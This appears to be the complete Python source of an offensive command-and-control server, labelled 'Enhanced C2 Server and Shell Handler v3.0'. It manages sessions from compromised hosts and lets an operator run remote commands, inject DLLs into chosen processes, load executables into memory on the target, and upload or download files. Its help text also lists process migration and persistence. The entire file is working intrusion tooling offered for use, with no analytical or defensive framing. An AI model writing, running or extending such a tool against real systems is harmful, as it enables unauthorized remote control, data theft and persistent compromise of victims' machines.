import socket
import threading
import argparse
import sys
import os
import time
import struct
import base64
import readline
import glob
import shlex
from pathlib import Path

# ANSI colors for better readability
class Colors:
    GREEN = '\033[92m'
    BLUE = '\033[94m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    CYAN = '\033[96m'
    MAGENTA = '\033[95m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'

def print_banner():
    banner = f"""
{Colors.BLUE}{Colors.BOLD}
██████╗██████╗     ██╗     ██╗███████╗████████╗███████╗███╗   ██╗███████╗██████╗ 
██╔════╝╚════██╗    ██║     ██║██╔════╝╚══██╔══╝██╔════╝████╗  ██║██╔════╝██╔══██╗
██║      █████╔╝    ██║     ██║███████╗   ██║   █████╗  ██╔██╗ ██║█████╗  ██████╔╝
██║     ██╔═══╝     ██║     ██║╚════██║   ██║   ██╔══╝  ██║╚██╗██║██╔══╝  ██╔══██╗
╚██████╗███████╗    ███████╗██║███████║   ██║   ███████╗██║ ╚████║███████╗██║  ██║
 ╚═════╝╚══════╝    ╚══════╝╚═╝╚══════╝   ╚═╝   ╚══════╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝
                                                                                   
{Colors.YELLOW}[ Enhanced C2 Server and Shell Handler v3.0 ]{Colors.ENDC}
"""
    print(banner)

# Global variables for storing client sessions
active_clients = {}
current_client = None
dll_path = None
command_history = []

# Setup command auto-completion
def complete(text, state):
    """Tab completion function for readline"""
    # Global commands
    global_commands = [
        'help', 'clients', 'interact', 'back', 'kill', 
        'setdll', 'clear', 'exit', '!ls', '!cd', '!pwd'
    ]
    
    # Client commands
    client_commands = [
        'sysinfo', 'processes', 'connections', 'inject',
        'loadexe', 'exec', 'shellhelp', 'exit', 'shell',
        'upload', 'download', 'screenshot', 'ps', 'migrate',
        'persist'
    ]
    
    # Add all commands to the completion list
    available_commands = global_commands
    if current_client:
        available_commands.extend(client_commands)
    
    # Handle !cd with directory completion
    if text.startswith('!cd '):
        dirname = text[4:]
        matches = glob.glob(dirname + '*')
        return [x + ' ' for x in matches if x.startswith(dirname)][state]
        
    # Handle setdll with file completion
    if text.startswith('setdll '):
        dirname = text[7:]
        matches = glob.glob(dirname + '*')
        return [x + ' ' for x in matches if x.startswith(dirname)][state]
        
    # Handle upload with file completion
    if text.startswith('upload '):
        dirname = text[7:]
        matches = glob.glob(dirname + '*')
        return [x + ' ' for x in matches if x.startswith(dirname)][state]
        
    # Command completion
    matches = [c + ' ' for c in available_commands if c.startswith(text)]
    return matches[state] if state < len(matches) else None

def handle_client(client_socket, addr, client_id):
    """Handle incoming client connections"""
    print(f"{Colors.GREEN}[*] Connection established from {addr[0]}:{addr[1]} (ID: {client_id}){Colors.ENDC}")
    
    # Set a short timeout for initial data check
    client_socket.settimeout(2)
    
    try:
        # Receive initial data from the client
        initial_data = receive_data_until_marker(client_socket, end_marker="[END]")
        
        if initial_data:
            print(f"\n{Colors.CYAN}===== SYSTEM INFORMATION =====\n{initial_data}{Colors.ENDC}")
    except socket.timeout:
        print(f"{Colors.YELLOW}[!] No initial data received from {addr[0]}:{addr[1]}{Colors.ENDC}")
    except Exception as e:
        print(f"{Colors.RED}[!] Error receiving initial data: {e}{Colors.ENDC}")
    
    # Reset socket timeout to None (blocking)
    client_socket.settimeout(None)
    
    # Store client info
    active_clients[client_id] = {
        "socket": client_socket,
        "address": addr,
        "last_active": time.time(),
        "info": initial_data
    }
    
    # Notify user if not currently interacting with another client
    global current_client
    if current_client is None:
        print(f"{Colors.YELLOW}[*] Type 'interact {client_id}' to interact with this client{Colors.ENDC}")
    
    # Keep connection alive until explicitly closed
    while client_id in active_clients:
        try:
            time.sleep(0.5)
        except KeyboardInterrupt:
            break
        except Exception:
            break

def receive_data_until_marker(client_socket, end_marker, timeout=None):
    """Receive data until a specific marker is encountered"""
    if timeout:
        client_socket.settimeout(timeout)
    
    buffer = ""
    try:
        while True:
            chunk = client_socket.recv(4096).decode('utf-8', 'ignore')
            if not chunk:
                break
            
            buffer += chunk
            
            if end_marker in buffer:
                buffer = buffer.split(end_marker)[0]
                break
    except socket.timeout:
        pass
    except Exception as e:
        print(f"{Colors.RED}[!] Error receiving data: {e}{Colors.ENDC}")
    
    # Reset timeout
    if timeout:
        client_socket.settimeout(None)
    
    return buffer

def send_command(client_id, command):
    """Send a command to a specific client"""
    if client_id not in active_clients:
        print(f"{Colors.RED}[!] Client {client_id} not found{Colors.ENDC}")
        return
    
    try:
        client_socket = active_clients[client_id]["socket"]
        client_socket.send(f"{command}\n".encode())
        
        # Update last active timestamp
        active_clients[client_id]["last_active"] = time.time()
        
        # Special handling for inject command
        if command.lower() == "inject":
            handle_dll_injection(client_socket)
            return
            
        # Special handling for loadexe command
        if command.lower() == "loadexe":
            handle_executable_loading(client_socket)
            return
            
        # Special handling for upload command
        if command.lower().startswith("upload "):
            handle_file_upload(client_socket, command[7:])
            return
            
        # Special handling for download command
        if command.lower().startswith("download "):
            handle_file_download(client_socket)
            return
        
        # Wait for response with proper flushing to avoid command buffering issues
        client_socket.settimeout(0.5)  # Short timeout to flush any pending data
        try:
            # Try to clear any pending data in the socket buffer
            while True:
                flush_buffer = client_socket.recv(4096)
                if not flush_buffer:
                    break
        except socket.timeout:
            # This is expected - no more data to flush
            pass
        except:
            # Some other error, ignore
            pass
        
        # Reset timeout and send the command again (clean environment)
        client_socket.settimeout(None)
        client_socket.send(f"{command}\n".encode())
        
        # Wait for response
        response = receive_data_until_marker(client_socket, "[END]", timeout=10)
        print(f"\n{Colors.CYAN}{response}{Colors.ENDC}")
    except Exception as e:
        print(f"{Colors.RED}[!] Error communicating with client {client_id}: {e}{Colors.ENDC}")
        remove_client(client_id)

def handle_file_upload(client_socket, file_args):
    """Handle uploading a file from the C2 server to the client"""
    try:
        # Parse arguments
        args = file_args.split()
        if len(args) != 2:
            print(f"{Colors.RED}[!] Usage: upload <local_path> <remote_path>{Colors.ENDC}")
            return
            
        local_path, remote_path = args
        
        # Check if local file exists
        if not os.path.exists(local_path):
            print(f"{Colors.RED}[!] Local file not found: {local_path}{Colors.ENDC}")
            return
            
        # Read the file
        with open(local_path, 'rb') as f:
            file_data = f.read()
            
        print(f"{Colors.YELLOW}[*] Sending file {local_path} ({len(file_data)} bytes) to {remote_path}...{Colors.ENDC}")
        
        # Wait for client to be ready
        response = receive_data_until_marker(client_socket, "[END]", timeout=5)
        print(f"\n{Colors.CYAN}{response}{Colors.ENDC}")
        
        # Send file size
        size_bytes = struct.pack("<I", len(file_data))
        client_socket.send(size_bytes)
        
        # Wait for acknowledgment
        time.sleep(0.5)
        
        # Send file data
        client_socket.sendall(file_data)
        
        # Wait for confirmation
        result = receive_data_until_marker(client_socket, "[END]", timeout=15)
        print(f"\n{Colors.CYAN}{result}{Colors.ENDC}")
    except Exception as e:
        print(f"{Colors.RED}[!] Error uploading file: {e}{Colors.ENDC}")

def handle_file_download(client_socket):
    """Handle downloading a file from the client to the C2 server"""
    try:
        # Wait for the client to send file info
        file_info = receive_data_until_marker(client_socket, "[END]", timeout=10)
        
        # Parse the file info to get the paths
        if "Sending file" not in file_info:
            print(f"{Colors.RED}[!] File download failed: Invalid response from client{Colors.ENDC}")
            return
        
        print(f"\n{Colors.CYAN}{file_info}{Colors.ENDC}")
        
        # Ask for the local save path if not specified
        if "Save to" not in file_info:
            local_path = input(f"{Colors.BOLD}Enter local path to save file: {Colors.ENDC}")
        else:
            # Extract path from message
            local_path = file_info.split("Save to ")[1].split("\n")[0].strip()
        
        # Wait for file size (4-byte integer)
        size_buffer = client_socket.recv(4)
        file_size = struct.unpack("<I", size_buffer)[0]
        
        print(f"{Colors.YELLOW}[*] Receiving file ({file_size} bytes)...{Colors.ENDC}")
        
        # Create directory if it doesn't exist
        directory = os.path.dirname(os.path.abspath(local_path))
        if directory and not os.path.exists(directory):
            os.makedirs(directory, exist_ok=True)
        
        # Receive file data
        with open(local_path, 'wb') as f:
            bytes_received = 0
            while bytes_received < file_size:
                chunk_size = min(4096, file_size - bytes_received)
                chunk = client_socket.recv(chunk_size)
                if not chunk:
                    break
                f.write(chunk)
                bytes_received += len(chunk)
                
                # Show progress
                percent = int((bytes_received / file_size) * 100)
                print(f"\r{Colors.YELLOW}[*] Progress: {percent}% ({bytes_received}/{file_size} bytes){Colors.ENDC}", end="")
        
        print(f"\n{Colors.GREEN}[+] File downloaded successfully to {local_path}{Colors.ENDC}")
        
        # Wait for final confirmation
        confirmation = receive_data_until_marker(client_socket, "[END]", timeout=5)
        if confirmation:
            print(f"\n{Colors.CYAN}{confirmation}{Colors.ENDC}")
    except Exception as e:
        print(f"{Colors.RED}[!] Error downloading file: {e}{Colors.ENDC}")

def handle_executable_loading(client_socket):
    """Handle loading an executable into memory on the client"""
    try:
        # Prompt for the executable file
        exe_path = input(f"{Colors.BOLD}Enter path to executable: {Colors.ENDC}")
        if not os.path.exists(exe_path):
            print(f"{Colors.RED}[!] File not found: {exe_path}{Colors.ENDC}")
            return
            
        with open(exe_path, 'rb') as f:
            exe_data = f.read()
            
        print(f"{Colors.YELLOW}[*] Sending {len(exe_data)} bytes to client...{Colors.ENDC}")
        
        # Wait for ready response
        ready_response = receive_data_until_marker(client_socket, "[END]", timeout=5)
        print(f"\n{Colors.CYAN}{ready_response}{Colors.ENDC}")
        
        # Send size
        size_bytes = struct.pack("<I", len(exe_data))
        client_socket.send(size_bytes)
        
        # Wait for acknowledgment
        ack_response = receive_data_until_marker(client_socket, "[END]", timeout=5)
        print(f"\n{Colors.CYAN}{ack_response}{Colors.ENDC}")
        
        # Send executable data
        client_socket.sendall(exe_data)
        
        # Wait for final response
        final_response = receive_data_until_marker(client_socket, "[END]", timeout=30)
        print(f"\n{Colors.CYAN}{final_response}{Colors.ENDC}")
        
        print(f"{Colors.GREEN}[+] Executable sent and loaded in memory{Colors.ENDC}")
        print(f"{Colors.YELLOW}[*] The callback should connect back separately. Use 'clients' to check for new connections.{Colors.ENDC}")
    except Exception as e:
        print(f"{Colors.RED}[!] Error loading executable: {e}{Colors.ENDC}")

def handle_dll_injection(client_socket):
    """Handle the DLL injection process with the client"""
    global dll_path
    
    if not dll_path:
        # Check if there's a DLL in the current directory
        dll_files = list(Path('.').glob('*.dll'))
        if dll_files:
            dll_path = str(dll_files[0])
            print(f"{Colors.GREEN}[+] Using DLL found in current directory: {dll_path}{Colors.ENDC}")
        else:
            print(f"{Colors.RED}[!] No DLL file specified or found in current directory{Colors.ENDC}")
            print(f"{Colors.YELLOW}[*] Use 'setdll <path>' to specify a DLL file{Colors.ENDC}")
            return
    elif not os.path.exists(dll_path):
        print(f"{Colors.RED}[!] DLL file not found: {dll_path}{Colors.ENDC}")
        return
    
    try:
        # Wait for the process list
        print(f"{Colors.YELLOW}[*] Waiting for process list from target...{Colors.ENDC}")
        process_list = receive_data_until_marker(client_socket, "[END]", timeout=10)
        print(f"\n{Colors.CYAN}{process_list}{Colors.ENDC}")
        
        # Wait for the prompt
        prompt = receive_data_until_marker(client_socket, ":", timeout=5)
        
        # Ask for target process ID
        target_pid = input(f"{Colors.BOLD}Enter target process ID: {Colors.ENDC}")
        client_socket.send(f"{target_pid}\n".encode())
        
        # Wait for confirmation
        confirmation = receive_data_until_marker(client_socket, "[END]", timeout=5)
        print(f"\n{Colors.CYAN}{confirmation}{Colors.ENDC}")
        
        # Send DLL file
        with open(dll_path, 'rb') as f:
            dll_data = f.read()
        
        # Send DLL size first (4-byte integer)
        size_bytes = struct.pack("<I", len(dll_data))
        client_socket.send(size_bytes)
        
        # Short delay to ensure proper sequencing
        time.sleep(0.5)
        
        # Send DLL data
        print(f"{Colors.YELLOW}[*] Sending DLL ({len(dll_data)} bytes)...{Colors.ENDC}")
        client_socket.sendall(dll_data)
        
        # Wait for injection result
        result = receive_data_until_marker(client_socket, "[END]", timeout=10)
        print(f"\n{Colors.CYAN}{result}{Colors.ENDC}")
        
        print(f"{Colors.YELLOW}[*] Waiting for DLL callback (this may take a moment)...{Colors.ENDC}")
    except Exception as e:
        print(f"{Colors.RED}[!] Error during DLL injection: {e}{Colors.ENDC}")

def remove_client(client_id):
    """Remove a client from the active clients list"""
    if client_id in active_clients:
        try:
            active_clients[client_id]["socket"].close()
        except:
            pass
        
        del active_clients[client_id]
        
        # Reset current client if it was the one removed
        global current_client
        if current_client == client_id:
            current_client = None
            print(f"{Colors.YELLOW}[*] Current session closed{Colors.ENDC}")
        
        print(f"{Colors.YELLOW}[*] Client {client_id} removed{Colors.ENDC}")

def start_listener(ip, port):
    """Start the C2 listener on the specified IP and port"""
    print(f"{Colors.YELLOW}[*] Starting C2 listener on {ip}:{port}{Colors.ENDC}")
    
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    try:
        server.bind((ip, port))
        server.listen(5)
        
        print(f"{Colors.GREEN}[+] Listening on {ip}:{port}{Colors.ENDC}")
        print(f"{Colors.YELLOW}[*] Type 'help' to see available commands{Colors.ENDC}")
        
        # Configure readline for command history and tab completion
        if 'libedit' in readline.__doc__:
            # macOS specific
            readline.parse_and_bind("bind ^I rl_complete")
        else:
            # Linux/Windows
            readline.parse_and_bind("tab: complete")
        
        readline.set_completer(complete)
        
        # Start client acceptance thread
        accept_thread = threading.Thread(target=accept_clients, args=(server,))
        accept_thread.daemon = True
        accept_thread.start()
        
        # Start command handling thread
        handle_commands()
    except KeyboardInterrupt:
        print(f"{Colors.YELLOW}[*] Keyboard interrupt received, exiting...{Colors.ENDC}")
    except Exception as e:
        print(f"{Colors.RED}[!] Error: {e}{Colors.ENDC}")
    finally:
        try:
            # Close all client connections
            for client_id in list(active_clients.keys()):
                remove_client(client_id)
            
            server.close()
        except:
            pass

def accept_clients(server):
    """Accept incoming client connections"""
    client_counter = 0
    
    while True:
        try:
            client_socket, addr = server.accept()
            client_counter += 1
            
            # Start a new thread to handle the client
            client_handler = threading.Thread(target=handle_client, args=(client_socket, addr, client_counter))
            client_handler.daemon = True
            client_handler.start()
        except Exception as e:
            print(f"{Colors.RED}[!] Error accepting client: {e}{Colors.ENDC}")
            break

def handle_commands():
    """Handle commands from the user"""
    global current_client, dll_path
    
    while True:
        try:
            # Determine the prompt based on current client
            if current_client:
                prompt = f"{Colors.BOLD}{Colors.GREEN}C2 ({current_client})>{Colors.ENDC} "
            else:
                prompt = f"{Colors.BOLD}{Colors.BLUE}C2>{Colors.ENDC} "
            
            command = input(prompt).strip()
            
            # Skip empty commands
            if not command:
                continue
            
            # Add to command history
            if command not in command_history:
                command_history.append(command)
                
            # Handle local shell commands (prefixed with !)
            if command.startswith('!'):
                handle_local_command(command[1:])
                continue
                
            # Handle global commands
            if command.lower() == "help":
                show_help()
            elif command.lower() == "clients":
                list_clients()
            elif command.lower().startswith("interact "):
                client_id = int(command.split(" ")[1])
                if client_id in active_clients:
                    current_client = client_id
                    print(f"{Colors.GREEN}[*] Now interacting with client {client_id}{Colors.ENDC}")
                else:
                    print(f"{Colors.RED}[!] Client {client_id} not found{Colors.ENDC}")
            elif command.lower() == "back":
                if current_client:
                    print(f"{Colors.YELLOW}[*] Stopped interacting with client {current_client}{Colors.ENDC}")
                    current_client = None
                else:
                    print(f"{Colors.YELLOW}[*] Not currently interacting with any client{Colors.ENDC}")
            elif command.lower().startswith("kill "):
                client_id = int(command.split(" ")[1])
                if client_id in active_clients:
                    send_command(client_id, "exit")
                    remove_client(client_id)
                else:
                    print(f"{Colors.RED}[!] Client {client_id} not found{Colors.ENDC}")
            elif command.lower().startswith("setdll "):
                dll_path = command.split(" ", 1)[1]
                if os.path.exists(dll_path):
                    print(f"{Colors.GREEN}[+] DLL path set to: {dll_path}{Colors.ENDC}")
                else:
                    print(f"{Colors.RED}[!] DLL file not found: {dll_path}{Colors.ENDC}")
                    dll_path = None
            elif command.lower() == "clear":
                os.system('cls' if os.name == 'nt' else 'clear')
                print_banner()
            elif command.lower() == "exit":
                print(f"{Colors.YELLOW}[*] Exiting...{Colors.ENDC}")
                # Close all client connections
                for client_id in list(active_clients.keys()):
                    remove_client(client_id)
                break
            # Handle client-specific commands when a client is selected
            elif current_client:
                send_command(current_client, command)
            else:
                print(f"{Colors.RED}[!] No client selected. Use 'interact <id>' first or type 'help'{Colors.ENDC}")
        except KeyboardInterrupt:
            print(f"\n{Colors.YELLOW}[*] Use 'exit' to quit{Colors.ENDC}")
        except Exception as e:
            print(f"{Colors.RED}[!] Error: {e}{Colors.ENDC}")
            
def handle_local_command(command):
    """Handle local shell commands prefixed with !"""
    try:
        if command.startswith('cd '):
            # Change directory
            new_dir = command[3:].strip()
            os.chdir(new_dir)
            print(f"{Colors.GREEN}[+] Changed directory to: {os.getcwd()}{Colors.ENDC}")
        elif command == 'pwd':
            # Print working directory
            print(f"{Colors.GREEN}[+] Current directory: {os.getcwd()}{Colors.ENDC}")
        elif command == 'ls' or command == 'dir':
            # List directory contents
            files = os.listdir('.')
            for f in files:
                if os.path.isdir(f):
                    print(f"{Colors.BLUE}{f}/{Colors.ENDC}")
                elif f.endswith('.dll'):
                    print(f"{Colors.MAGENTA}{f}{Colors.ENDC}")
                elif os.access(f, os.X_OK):
                    print(f"{Colors.GREEN}{f}{Colors.ENDC}")
                else:
                    print(f)
        else:
            # Execute other shell commands
            output = os.popen(command).read()
            print(output)
    except Exception as e:
        print(f"{Colors.RED}[!] Error executing local command: {e}{Colors.ENDC}")

def show_help():
    """Show available commands"""
    help_text = f"""
{Colors.BOLD}=== GLOBAL COMMANDS ==={Colors.ENDC}
{Colors.YELLOW}help{Colors.ENDC}              - Show this help menu
{Colors.YELLOW}clients{Colors.ENDC}           - List all connected clients
{Colors.YELLOW}interact <id>{Colors.ENDC}     - Interact with a specific client
{Colors.YELLOW}back{Colors.ENDC}              - Stop interacting with the current client
{Colors.YELLOW}kill <id>{Colors.ENDC}         - Terminate a client connection
{Colors.YELLOW}setdll <path>{Colors.ENDC}     - Set the DLL file to use for injection
{Colors.YELLOW}clear{Colors.ENDC}             - Clear the screen
{Colors.YELLOW}exit{Colors.ENDC}              - Exit the C2 server

{Colors.BOLD}=== LOCAL SHELL COMMANDS ==={Colors.ENDC}
{Colors.YELLOW}!ls{Colors.ENDC}               - List files in the current directory
{Colors.YELLOW}!pwd{Colors.ENDC}              - Print current working directory
{Colors.YELLOW}!cd <path>{Colors.ENDC}        - Change directory
{Colors.YELLOW}!<command>{Colors.ENDC}        - Execute any local shell command

{Colors.BOLD}=== BASIC CLIENT COMMANDS ==={Colors.ENDC}
{Colors.YELLOW}sysinfo{Colors.ENDC}           - Get detailed system information
{Colors.YELLOW}processes{Colors.ENDC}         - List running processes
{Colors.YELLOW}connections{Colors.ENDC}       - List network connections
{Colors.YELLOW}inject{Colors.ENDC}            - Inject DLL into a process (requires setdll first)
{Colors.YELLOW}loadexe{Colors.ENDC}           - Load and execute an executable in memory
{Colors.YELLOW}exec <command>{Colors.ENDC}    - Execute a shell command
{Colors.YELLOW}exit{Colors.ENDC}              - Terminate the client connection

{Colors.BOLD}=== ADVANCED CLIENT COMMANDS ==={Colors.ENDC}
{Colors.YELLOW}shell{Colors.ENDC}             - Drop into an interactive shell mode
{Colors.YELLOW}upload <local> <remote>{Colors.ENDC} - Upload a file to the target
{Colors.YELLOW}download <remote> <local>{Colors.ENDC} - Download a file from the target
{Colors.YELLOW}ps{Colors.ENDC}                - List running processes (advanced version)
{Colors.YELLOW}migrate <pid>{Colors.ENDC}     - Migrate to another process
{Colors.YELLOW}persist{Colors.ENDC}           - Install persistence mechanism
{Colors.YELLOW}screenshot{Colors.ENDC}        - Take a screenshot (if supported)

{Colors.BOLD}Note:{Colors.ENDC} Advanced commands are available only with the advanced callback.
{Colors.BOLD}Note:{Colors.ENDC} All commands support tab completion.
"""
    print(help_text)

def list_clients():
    """List all connected clients"""
    if not active_clients:
        print(f"{Colors.YELLOW}[*] No clients connected{Colors.ENDC}")
        return
    
    print(f"\n{Colors.BOLD}{'ID':<5} {'IP Address':<15} {'Port':<8} {'Last Active':<25}{Colors.ENDC}")
    print("-" * 60)
    
    for client_id, client_info in active_clients.items():
        addr = client_info["address"]
        last_active = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime(client_info["last_active"]))
        
        # Highlight current client
        if client_id == current_client:
            print(f"{Colors.GREEN}{client_id:<5} {addr[0]:<15} {addr[1]:<8} {last_active:<25}{Colors.ENDC}")
        else:
            print(f"{client_id:<5} {addr[0]:<15} {addr[1]:<8} {last_active:<25}")
    
    print("")

def main():
    """Main function to parse arguments and start the listener"""
    
    # Clear screen 
    os.system('cls' if os.name == 'nt' else 'clear')
    
    print_banner()
    
    parser = argparse.ArgumentParser(description='Enhanced C2 Server and Listener')
    parser.add_argument('-p', '--port', type=int, default=5555, help='Port to listen on (default: 5555)')
    parser.add_argument('-i', '--ip', type=str, default='0.0.0.0', help='IP address to bind to (default: 0.0.0.0)')
    parser.add_argument('-d', '--dll', type=str, help='Path to DLL file for injection')
    
    args = parser.parse_args()
    
    # Set DLL path if provided
    global dll_path
    if args.dll:
        if os.path.exists(args.dll):
            dll_path = args.dll
            print(f"{Colors.GREEN}[+] DLL path set to: {dll_path}{Colors.ENDC}")
        else:
            print(f"{Colors.RED}[!] DLL file not found: {args.dll}{Colors.ENDC}")
    
    try:
        start_listener(args.ip, args.port)
    except Exception as e:
        print(f"{Colors.RED}[!] Error starting listener: {e}{Colors.ENDC}")

if __name__ == "__main__":
    main()
